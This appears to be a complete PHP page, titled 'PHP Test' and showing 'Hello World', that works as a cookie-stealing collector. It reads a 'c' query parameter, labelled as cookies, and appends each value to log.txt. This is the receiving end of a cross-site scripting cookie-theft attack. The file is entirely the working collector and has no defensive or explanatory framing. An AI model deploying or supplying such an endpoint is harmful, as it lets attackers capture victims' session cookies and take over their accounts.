<html>
    <head>
        <title>PHP Test</title>
    </head>
    <body>
        <p>Hello World</p>
        <?php
            $cookies = $_GET["c"];
            $file = fopen('log.txt', 'a');
            fwrite($file, $cookies . "\n\n");
        ?>
    </body>
</html>
